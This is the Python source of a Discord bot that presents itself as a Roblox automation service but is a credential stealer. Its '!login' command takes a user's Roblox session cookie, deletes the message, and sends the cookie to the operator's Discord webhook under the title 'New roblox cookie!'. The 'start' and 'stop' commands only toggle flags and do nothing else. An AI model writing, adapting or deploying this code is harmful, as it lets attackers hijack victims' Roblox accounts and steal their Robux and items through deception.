import discord
from discord.ext import commands
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
import re
import configparser
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
bot.remove_command("help")
your_webhook = ""
your_bot_token = ""
config = configparser.ConfigParser()
config.read("database.ini")

def checke_cookie(cookie):
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if cookie.startswith(warning_text):
        return True
    else:
        return False

async def check_cookie(cookie):
  if checke_cookie(cookie) != True:
      return False
  
  webhook = DiscordWebhook(url=your_webhook)
  try:
    embed = DiscordEmbed(title='New roblox cookie!', description='enjoy', color='03b2f8')
    embed.add_embed_field(name="Cookie", value=f"```{cookie}```")

    webhook.add_embed(embed)
    response = webhook.execute()
    print(response)
    return True
  except Exception as e:
        print(e)
        return False

@bot.command(name="login")
async def login(ctx, cookie):
    await ctx.message.delete()
    if str(ctx.author.id) in config["loggedin"]:
      embed = discord.Embed(title="You are already logged in. Please use !logout and try again", color=0xff0000)
    elif await check_cookie(cookie):
        config.set('loggedin', str(ctx.author.id), 'true')
        embed = discord.Embed(title="Logged in Sucsessfully!", color=0x00ff04)
        with open("database.ini", "w") as configfile:
          config.write(configfile)
    else:
        embed = discord.Embed(title="Login failed. Please check your cookie and try again.", color=0xff0000)
    await ctx.send(ctx.author.mention, embed=embed)

@bot.command(name="logout")
async def logout(ctx):
  if str(ctx.author.id) in config["loggedin"]:
      embed = discord.Embed(title="Logged out Sucsessfully!", color=0x00ff04)
      config.remove_option("loggedin", str(ctx.author.id))
      if str(ctx.author.id) in config["running"]:
        config.remove_option("running", str(ctx.author.id))
      with open("database.ini", "w") as configfile:
          config.write(configfile)
  else:
      embed = discord.Embed(title="You are not logged in. Please use !login and try again", color=0xff0000)
  await ctx.send(ctx.author.mention, embed=embed)

@bot.command(name="start")
async def start(ctx):
 if str(ctx.author.id) in config["loggedin"]:
  if str(ctx.author.id) in config["running"]:
    embed = discord.Embed(title="You are already running the bot. Please use !stop and try again", color=0xff0000)
  else:
    embed = discord.Embed(title="Succesfully started the bot.", color=0x00ff04)
    config.set('running', str(ctx.author.id), 'true')
    with open("database.ini", "w") as configfile:
          config.write(configfile)
 else:
   embed = discord.Embed(title="You are not logged in. Please use !login and try again.", color=0xff0000)
 await ctx.send(ctx.author.mention, embed=embed)

@bot.command(name="stop")
async def stop(ctx):
 if str(ctx.author.id) in config["loggedin"]:
  if str(ctx.author.id) in config["running"]:
    embed = discord.Embed(title="Succesfully stopped the bot.", color=0x00ff04)
    config.remove_option("running", str(ctx.author.id))
    with open("database.ini", "w") as configfile:
          config.write(configfile)
  else:
    embed = discord.Embed(title="You are not running the bot. Please use !start and try again", color=0xff0000)
 else:
   embed = discord.Embed(title="You are not logged in. Please use !login and try again.", color=0xff0000)
 await ctx.send(ctx.author.mention, embed=embed)
  
@bot.command()
async def help(ctx):
    embed = discord.Embed(title="Help", description="List of commands")
    embed.add_field(name="login", value=" ")
    embed.add_field(name="logout", value=" ")
    embed.add_field(name="start", value=" ")
    embed.add_field(name="stop", value=" ")
    await ctx.send(embed=embed)

bot.run(your_bot_token)
